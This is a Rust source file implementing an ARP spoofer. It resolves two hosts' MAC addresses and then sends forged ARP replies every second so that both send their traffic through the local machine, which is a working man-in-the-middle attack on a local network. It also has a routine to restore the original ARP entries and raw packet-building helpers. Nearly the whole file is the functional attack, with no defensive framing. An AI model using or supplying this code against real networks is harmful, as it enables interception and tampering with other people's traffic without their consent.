use crate::net::*;

use std::net::{IpAddr, Ipv4Addr};
use std::time::Duration;
use std::thread;

use pnet::datalink::{DataLinkSender, DataLinkReceiver};
use pnet::datalink::MacAddr;

use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket, EtherTypes};
use pnet::packet::{MutablePacket, Packet};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperation, ArpOperations};
use pnet::packet::arp::{ArpPacket, MutableArpPacket};

use std::sync::Mutex;

pub struct ArpSpoofer {
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    target_mac: MacAddr,
    local_mac: MacAddr,
    tx: Mutex<Box<DataLinkSender>>,
}

impl ArpSpoofer {
    pub fn new(interface: &str,
               source_ip: Ipv4Addr,
               target_ip: Ipv4Addr) -> ArpSpoofer {
        
        let (mut tx, mut rx, iface) = open_datalink_if(interface);

        let local_mac = iface.mac_address();
        let local_ip = iface.ips.first().unwrap().ip();
        let local_ipv4 = match local_ip {
            IpAddr::V4(local_ipv4) => local_ipv4,
            _ => panic!("You don't have an IPv4 address I guess?")
        };

        // TODO: This is a lot of work to be doing in the constructor. Maybe
        // reconsider
        let source_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, source_ip);
        let target_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, target_ip);

        println!("My IP: {}", local_ip);
        println!("Source MAC: {}", source_mac);
        println!("Target MAC: {}", target_mac);

        ArpSpoofer {
            source_ip,
            target_ip,
            source_mac,
            target_mac,
            local_mac,
            tx: Mutex::new(tx),
        }
    }

    pub fn spoof(&self) {
        loop {
            {
                let mut t = self.tx.lock().unwrap();
                // Send packet to bind source ip to local mac
                send_arp(&mut **t,
                         self.source_ip,
                         self.local_mac,
                         self.target_ip,
                         self.target_mac,
                         ArpOperations::Reply);

                // Send packet to bind target ip to local mac
                send_arp(&mut **t,
                         self.target_ip,
                         self.local_mac,
                         self.source_ip,
                         self.source_mac,
                         ArpOperations::Reply);
            }

            thread::sleep(Duration::from_millis(1000));
        }
    }

    pub fn restore_arp_state(&self) {
        let mut t = self.tx.lock().unwrap();

        // Restore correct state of the world
        send_arp(&mut **t,
                 self.source_ip,
                 self.source_mac,
                 self.target_ip,
                 self.target_mac,
                 ArpOperations::Reply);

        send_arp(&mut **t,
                 self.target_ip,
                 self.target_mac,
                 self.source_ip,
                 self.source_mac,
                 ArpOperations::Reply);
    }
}

// Private helpers
pub fn send_arp(tx: &mut DataLinkSender,
                send_ip: Ipv4Addr,
                send_mac: MacAddr,
                rec_ip: Ipv4Addr,
                rec_mac: MacAddr,
                op: ArpOperation) {
    let mut eth_buf = [0u8; 42];
    let mut eth_pkt = MutableEthernetPacket::new(&mut eth_buf).unwrap();

    eth_pkt.set_destination(rec_mac);
    eth_pkt.set_source(send_mac);
    eth_pkt.set_ethertype(EtherTypes::Arp);

    let mut arp_buf = [0u8; 28];
    let mut arp_pkt = MutableArpPacket::new(&mut arp_buf).unwrap();

    arp_pkt.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_pkt.set_protocol_type(EtherTypes::Ipv4);
    arp_pkt.set_hw_addr_len(6);
    arp_pkt.set_proto_addr_len(4);
    arp_pkt.set_operation(op);
    arp_pkt.set_sender_hw_addr(send_mac);
    arp_pkt.set_sender_proto_addr(send_ip);
    arp_pkt.set_target_hw_addr(rec_mac);
    arp_pkt.set_target_proto_addr(rec_ip);

    eth_pkt.set_payload(arp_pkt.packet_mut());

    tx.send_to(eth_pkt.packet(), None);
}

pub fn lookup_arp(tx: &mut DataLinkSender,
                  rx: &mut DataLinkReceiver,
                  send_ip: Ipv4Addr,
                  send_mac: MacAddr,
                  rec_ip: Ipv4Addr) -> MacAddr {
    let target_mac = MacAddr::new(255, 255, 255, 255, 255, 255);


    // TODO: Timeout
    loop {
        send_arp(&mut *tx, send_ip, send_mac, rec_ip, target_mac, ArpOperations::Request);

        match rx.next() {
            Ok(data) => {
                let ethernet_packet = EthernetPacket::new(data).unwrap();
                let ethernet_payload = ethernet_packet.payload();
                let arp_packet = ArpPacket::new(ethernet_payload).unwrap();
                let arp_reply_op = ArpOperation::new(2_u16);

                if arp_packet.get_operation() == arp_reply_op {
                    return arp_packet.get_sender_hw_addr();
                }
            },
            Err(e) => panic!("An error occurred while reading packet: {}", e)
        }
    }
}

